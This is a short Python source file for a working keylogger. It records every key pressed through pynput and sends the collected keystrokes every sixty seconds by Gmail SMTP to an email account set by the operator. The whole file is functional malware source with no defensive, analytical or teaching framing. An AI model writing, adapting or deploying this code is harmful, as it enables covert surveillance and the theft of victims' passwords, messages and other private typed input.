#!/usr/bin/env python3

from pynput import keyboard
import threading
import smtplib 

'''
Send an email with log results of key logging
'''
def send_mail(email, password, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, msg)
    server.quit()


'''
Keylogger class
'''
class Keylogger:
    '''
    Constructor
    '''
    def __init__(self, email, password, refresh_time=60):
        self.log = ''
        self.email = email #Gmail address
        self.password = password #Password of the mail
        self.refresh_time = refresh_time #DEFAULT: 60s=1m

    '''
    Callback called by listener in 
    '''
    def press_key(self, key):
        #Obtain string of key inserted
        try:
            key_string = str(key.char)
        except AttributeError:
            #Special key pressed
            if key == key.space: 
                #Otherwise printed 'key space'
                key_string = " "
            else:
                key_string = " " + str(key) + " "
        
        self.log += key_string

    '''
    Function executed by thread that periodicaly sends logged keys
    '''
    def report(self):
        #Send mail with obtained log
        send_mail(self.email, self.password, self.log)
        self.log = ''
        
        #Timer run in parallel every self.refresh_time seconds
        timer = threading.Timer(self.refresh_time, self.report)
        timer.start()

    '''
    Main function
    '''
    def start(self):
        #Listener for keyboard input working in parallel with timer for printing
        with keyboard.Listener(on_press=self.press_key) as listener:
            #Send info
            self.report()
            #Manage keyboard input
            listener.join()
